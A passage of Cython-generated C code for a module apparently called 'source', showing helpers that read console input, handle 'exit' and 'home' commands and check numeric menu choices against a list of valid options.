static PyObject *__pyx_pf_6source_2check_home(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_input_value); /* proto */
static PyObject *__pyx_pf_6source_4get_valid_input(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_prompt, PyObject *__pyx_v_valid_options); /* proto */
static PyObject *__pyx_pf_6source_6get_valid_integer_input(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_prompt); /* proto */
static PyObject *__pyx_pf_6source_8report_entity(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_client); /* proto */
static PyObject *__pyx_pf_6source_11main(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_tp_new_6source___pyx_scope_struct__report_entity(PyTypeObject *t, PyObject *a, PyObject *k); /*proto*/
static PyObject *__pyx_int_1;
static PyObject *__pyx_int_2;
static PyObject *__pyx_int_3;
static PyObject *__pyx_int_4;
static PyObject *__pyx_int_5;
static PyObject *__pyx_int_6;
static PyObject *__pyx_int_7;
static PyObject *__pyx_int_8;
static PyObject *__pyx_int_9;
static PyObject *__pyx_int_10;
static PyObject *__pyx_tuple_;
static PyObject *__pyx_tuple__3;
static PyObject *__pyx_tuple__4;
static PyObject *__pyx_tuple__6;
static PyObject *__pyx_tuple__7;
static PyObject *__pyx_tuple__8;
static PyObject *__pyx_tuple__9;
static PyObject *__pyx_tuple__11;
static PyObject *__pyx_tuple__13;
static PyObject *__pyx_tuple__14;
static PyObject *__pyx_tuple__16;
static PyObject *__pyx_tuple__17;
static PyObject *__pyx_tuple__18;
static PyObject *__pyx_tuple__20;
static PyObject *__pyx_tuple__22;
static PyObject *__pyx_tuple__23;
static PyObject *__pyx_tuple__24;
static PyObject *__pyx_tuple__25;
static PyObject *__pyx_tuple__27;
static PyObject *__pyx_tuple__29;
static PyObject *__pyx_tuple__31;
static PyObject *__pyx_tuple__32;
static PyObject *__pyx_tuple__35;
static PyObject *__pyx_tuple__36;
static PyObject *__pyx_codeobj__5;
static PyObject *__pyx_codeobj__26;
static PyObject *__pyx_codeobj__28;
static PyObject *__pyx_codeobj__30;
static PyObject *__pyx_codeobj__33;
static PyObject *__pyx_codeobj__37;
/* Late includes */



/* Python wrapper */
static PyObject *__pyx_pw_6source_1check_exit(PyObject *__pyx_self, PyObject *__pyx_v_input_value); /*proto*/
static PyMethodDef __pyx_mdef_6source_1check_exit = {"check_exit", (PyCFunction)__pyx_pw_6source_1check_exit, METH_O, 0};
static PyObject *__pyx_pw_6source_1check_exit(PyObject *__pyx_self, PyObject *__pyx_v_input_value) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("check_exit (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_check_exit(__pyx_self, ((PyObject *)__pyx_v_input_value));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_check_exit(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_input_value) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("check_exit", 0);

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_input_value, __pyx_n_s_lower); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_4 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_n_u_exit, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_t_4) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_colored); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 41, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 41, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 41, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_sys); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_exit); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("source.check_exit", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_3check_home(PyObject *__pyx_self, PyObject *__pyx_v_input_value); /*proto*/
static PyMethodDef __pyx_mdef_6source_3check_home = {"check_home", (PyCFunction)__pyx_pw_6source_3check_home, METH_O, 0};
static PyObject *__pyx_pw_6source_3check_home(PyObject *__pyx_self, PyObject *__pyx_v_input_value) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("check_home (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_2check_home(__pyx_self, ((PyObject *)__pyx_v_input_value));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_2check_home(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_input_value) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("check_home", 0);

  
  __Pyx_XDECREF(__pyx_r);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_input_value, __pyx_n_s_lower); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyObject_RichCompare(__pyx_t_1, __pyx_n_u_home, Py_EQ); __Pyx_XGOTREF(__pyx_t_2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 46, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_r = __pyx_t_2;
  __pyx_t_2 = 0;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("source.check_home", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5get_valid_input(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_5get_valid_input = {"get_valid_input", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_5get_valid_input, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_6source_5get_valid_input(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_prompt = 0;
  PyObject *__pyx_v_valid_options = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("get_valid_input (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_prompt,&__pyx_n_s_valid_options,0};
    PyObject* values[2] = {0,0};
    values[1] = ((PyObject *)((PyObject *)Py_None));
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_prompt)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (kw_args > 0) {
          PyObject* value = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_valid_options);
          if (value) { values[1] = value; kw_args--; }
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "get_valid_input") < 0)) __PYX_ERR(0, 49, __pyx_L3_error)
      }
    } else {
      switch (PyTuple_GET_SIZE(__pyx_args)) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        break;
        default: goto __pyx_L5_argtuple_error;
      }
    }
    __pyx_v_prompt = values[0];
    __pyx_v_valid_options = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("get_valid_input", 0, 1, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 49, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("source.get_valid_input", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_6source_4get_valid_input(__pyx_self, __pyx_v_prompt, __pyx_v_valid_options);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_4get_valid_input(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_prompt, PyObject *__pyx_v_valid_options) {
  PyObject *__pyx_v_user_input = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  Py_ssize_t __pyx_t_11;
  Py_UCS4 __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("get_valid_input", 0);

  
  while (1) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_colored); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    __pyx_t_4 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
        __pyx_t_4 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_2)) {
      PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_v_prompt, __pyx_n_u_red};
      __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_4, 2+__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 51, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_GOTREF(__pyx_t_1);
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
      PyObject *__pyx_temp[3] = {__pyx_t_3, __pyx_v_prompt, __pyx_n_u_red};
      __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_4, 2+__pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 51, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_GOTREF(__pyx_t_1);
    } else
    #endif
    {
      __pyx_t_5 = PyTuple_New(2+__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 51, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      if (__pyx_t_3) {
        __Pyx_GIVEREF(__pyx_t_3); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_3); __pyx_t_3 = NULL;
      }
      __Pyx_INCREF(__pyx_v_prompt);
      __Pyx_GIVEREF(__pyx_v_prompt);
      PyTuple_SET_ITEM(__pyx_t_5, 0+__pyx_t_4, __pyx_v_prompt);
      __Pyx_INCREF(__pyx_n_u_red);
      __Pyx_GIVEREF(__pyx_n_u_red);
      PyTuple_SET_ITEM(__pyx_t_5, 1+__pyx_t_4, __pyx_n_u_red);
      __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_5, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 51, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_input, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 51, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF_SET(__pyx_v_user_input, __pyx_t_2);
    __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_check_exit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 52, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_v_user_input) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_user_input);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 52, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_check_home); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 53, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_v_user_input) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_user_input);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 53, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 53, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (__pyx_t_6) {

      
      __Pyx_XDECREF(__pyx_r);
      __Pyx_INCREF(__pyx_n_u_home);
      __pyx_r = __pyx_n_u_home;
      goto __pyx_L0;

      
    }

    
    __pyx_t_6 = __Pyx_PyObject_IsTrue(__pyx_v_valid_options); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 55, __pyx_L1_error)
    if (__pyx_t_6) {

      
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_9);
        /*try:*/ {

          
          __pyx_t_2 = __Pyx_PyNumber_Int(__pyx_v_user_input); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 57, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF_SET(__pyx_v_user_input, __pyx_t_2);
          __pyx_t_2 = 0;

          
          __pyx_t_6 = (__Pyx_PySequence_ContainsTF(__pyx_v_user_input, __pyx_v_valid_options, Py_EQ)); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 58, __pyx_L7_error)
          __pyx_t_10 = (__pyx_t_6 != 0);
          if (__pyx_t_10) {

            
            __Pyx_XDECREF(__pyx_r);
            __Pyx_INCREF(__pyx_v_user_input);
            __pyx_r = __pyx_v_user_input;
            goto __pyx_L11_try_return;

            
          }

          
          /*else*/ {

            
            __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_colored); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 62, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_1);

            
            __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 63, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_11 = 0;
            __pyx_t_12 = 127;
            __Pyx_INCREF(__pyx_kp_u_Please_select_a_valid_option_fro);
            __pyx_t_11 += 34;
            __Pyx_GIVEREF(__pyx_kp_u_Please_select_a_valid_option_fro);
            PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u_Please_select_a_valid_option_fro);
            __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_v_valid_options, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 63, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_12;
            __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_3);
            PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_3);
            __pyx_t_3 = 0;
            __Pyx_INCREF(__pyx_kp_u__2);
            __pyx_t_11 += 1;
            __Pyx_GIVEREF(__pyx_kp_u__2);
            PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u__2);
            __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_5, 3, __pyx_t_11, __pyx_t_12); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 63, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = NULL;
            __pyx_t_4 = 0;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
              __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
              if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_1, function);
                __pyx_t_4 = 1;
              }
            }
            #if CYTHON_FAST_PYCALL
            if (PyFunction_Check(__pyx_t_1)) {
              PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_t_3, __pyx_n_u_red};
              __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_4, 2+__pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 62, __pyx_L7_error)
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            } else
            #endif
            #if CYTHON_FAST_PYCCALL
            if (__Pyx_PyFastCFunction_Check(__pyx_t_1)) {
              PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_t_3, __pyx_n_u_red};
              __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_1, __pyx_temp+1-__pyx_t_4, 2+__pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 62, __pyx_L7_error)
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            } else
            #endif
            {
              __pyx_t_13 = PyTuple_New(2+__pyx_t_4); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 62, __pyx_L7_error)
              __Pyx_GOTREF(__pyx_t_13);
              if (__pyx_t_5) {
                __Pyx_GIVEREF(__pyx_t_5); PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_5); __pyx_t_5 = NULL;
              }
              __Pyx_GIVEREF(__pyx_t_3);
              PyTuple_SET_ITEM(__pyx_t_13, 0+__pyx_t_4, __pyx_t_3);
              __Pyx_INCREF(__pyx_n_u_red);
              __Pyx_GIVEREF(__pyx_n_u_red);
              PyTuple_SET_ITEM(__pyx_t_13, 1+__pyx_t_4, __pyx_n_u_red);
              __pyx_t_3 = 0;
              __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_13, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 62, __pyx_L7_error)
              __Pyx_GOTREF(__pyx_t_2);
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
            }
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

            
            __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 61, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }

          
        }
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        goto __pyx_L14_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __pyx_t_4 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_ValueError);
        if (__pyx_t_4) {
          __Pyx_AddTraceback("source.get_valid_input", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_2, &__pyx_t_13) < 0) __PYX_ERR(0, 65, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_GOTREF(__pyx_t_13);

          
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_colored); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 66, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__3, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 66, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 66, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
